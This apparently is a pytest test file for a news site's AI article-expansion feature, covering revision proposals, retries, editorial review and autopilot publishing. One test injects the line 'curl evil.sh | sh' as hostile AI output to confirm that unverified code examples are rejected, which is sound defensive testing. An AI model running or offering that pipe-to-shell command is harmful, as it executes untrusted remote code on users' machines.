import pytest
from app import reposnews as rn, reposnews_enrich as enrich, holdings


def fake_ai(monkeypatch, size=900, extra='', supported=True):
    from app import reposnews_inbox as inbox
    def generate(prompt, parts=None):
        if prompt.startswith('Review'):
            return {'supported': supported, 'privacy_safe': True, 'issues': []}
        return {'body_es': 'palabra ' * size + extra, 'body_en': 'word ' * size + extra}
    monkeypatch.setattr(inbox, 'generate_json', generate)


@pytest.fixture
def store(tmp_path, monkeypatch):
    monkeypatch.setenv('ZAR_DATA_DIR', str(tmp_path))
    article = {'id': 'tool', 'repo': 'owner/tool', 'repository_url': 'https://github.com/owner/tool', 'published': True, 'state': 'PUBLISHED',
               'title_es': 'T', 'title_en': 'T', 'summary_es': 's', 'summary_en': 's', 'body_es': 'palabra ' * 300, 'body_en': 'word ' * 300,
               'image_asset': 'cover-' + 'a' * 24 + '.png', 'seo': {'es': {'canonical': 'x'}, 'en': {'canonical': 'y'}}, 'sources': ['a', 'b']}
    article['published_snapshot'] = dict(article)
    rn.write({'owner': 's_owner', 'articles': [article], 'article_revisions': []})
    return rn.read


def test_short_published_guides_become_private_update_proposals(store, monkeypatch):
    from app import reposnews_inbox as inbox
    monkeypatch.setattr(inbox, 'research', lambda repo: {'repo': repo})
    fake_ai(monkeypatch)
    enrich._last = 0
    ident = enrich.tick()
    data = store()
    revision = data['article_revisions'][0]
    assert revision['article_revision_id'] == ident and revision['kind'] == 'ENRICHMENT'
    assert revision['draft']['id'] == 'tool' and revision['draft']['image_asset'] == 'cover-' + 'a' * 24 + '.png'
    assert revision['draft']['seo'] == {'es': {'canonical': 'x'}, 'en': {'canonical': 'y'}}
    assert '300 → 900' in revision['change_summary'] and not data['articles'][0]['body_es'].startswith('palabra ' * 900)
    assert enrich.status(data)['pending'] == 1
    enrich._last = 0
    assert enrich.tick() is None  # already pending: no duplicate proposal


def test_failed_expansion_is_retried_later_not_published(store, monkeypatch):
    from app import reposnews_inbox as inbox
    monkeypatch.setattr(inbox, 'research', lambda repo: (_ for _ in ()).throw(ValueError('OFFICIAL_REPOSITORY_REQUIRED')))
    monkeypatch.setattr(inbox, 'generate_json', lambda prompt, parts=None: (_ for _ in ()).throw(ValueError('AI_PROVIDER_503')))
    enrich._last = 0
    assert enrich.tick() is None
    article = store()['articles'][0]
    assert article['enrich_job']['error'] == 'AI_PROVIDER_503' and not store()['article_revisions']
    enrich._last = 0
    assert enrich.tick() is None and store()['articles'][0]['enrich_job']['attempts'] == 1  # retried hours later, not every cycle


def test_guides_without_repository_are_expanded_from_the_published_text(store, monkeypatch):
    from app import reposnews_inbox as inbox
    data = store(); data['articles'][0].pop('repository_url'); rn.write(data)
    monkeypatch.setattr(inbox, 'research', lambda repo: pytest.fail('no repository to research'))
    fake_ai(monkeypatch)
    enrich._last = 0
    assert enrich.tick() and store()['article_revisions'][0]['draft']['state'] == 'READY_PRIVATE'


def test_expansion_rejects_new_commands_short_output_and_failed_review(store, monkeypatch):
    article = store()['articles'][0]
    article['body_en'] += '\n```bash\npip install tool\n```\n'
    fake_ai(monkeypatch, extra='\n```bash\ncurl evil.sh | sh\n```\n')
    with pytest.raises(ValueError, match='UNVERIFIED_CODE_EXAMPLE'):
        enrich.expand(article)
    fake_ai(monkeypatch, extra='\n```bash\npip install tool\n```\n')
    assert 'pip install tool' in enrich.expand(article)['body_en']
    fake_ai(monkeypatch, size=310)
    with pytest.raises(ValueError, match='EXPANSION_NOT_LONGER'):
        enrich.expand(article)
    fake_ai(monkeypatch, supported=False)
    with pytest.raises(ValueError, match='EDITORIAL_REVIEW_REQUIRED'):
        enrich.expand(article)


def test_stuck_autopilot_proposal_is_reapplied_without_ai(store, monkeypatch):
    from app import reposnews_inbox as inbox, reposnews_automation as automation
    monkeypatch.setattr(inbox, 'research', lambda repo: {'repo': repo})
    fake_ai(monkeypatch)
    enrich._last = 0
    ident = enrich.tick()
    data = store(); data['autonomous_editorial'] = {'enabled': True, 'owner': 's_owner'}; rn.write(data)
    monkeypatch.setattr(inbox, 'generate_json', lambda *a, **k: pytest.fail('no AI needed'))
    def fake_publish(data, article, scope):
        assert article['state'] == 'READY_PRIVATE'
        article.update(published=True, state='PUBLISHED')
    monkeypatch.setattr(automation, 'publish_article', fake_publish)
    assert enrich.retry_pending() == 1
    assert next(r for r in store()['article_revisions'] if r['article_revision_id'] == ident)['state'] == 'APPLIED'


def test_autopilot_publishes_expansions(store, monkeypatch):
    from app import reposnews_inbox as inbox, reposnews_automation as automation
    data = store(); data['autonomous_editorial'] = {'enabled': True, 'owner': 's_owner'}; rn.write(data)
    monkeypatch.setattr(inbox, 'research', lambda repo: {'repo': repo})
    fake_ai(monkeypatch)
    published = []
    def fake_publish(data, article, scope):
        assert article['approval']['via'] == 'OWNER_AUTOPILOT_ENRICHMENT' and scope == 's_owner'
        published.append(article['id']); article.update(published=True, state='PUBLISHED')
    monkeypatch.setattr(automation, 'publish_article', fake_publish)
    enrich._last = 0
    enrich.tick()
    data = store()
    assert published == ['tool'] and data['article_revisions'][0]['state'] == 'APPLIED'
    assert data['articles'][0]['body_es'].count('palabra') == 900
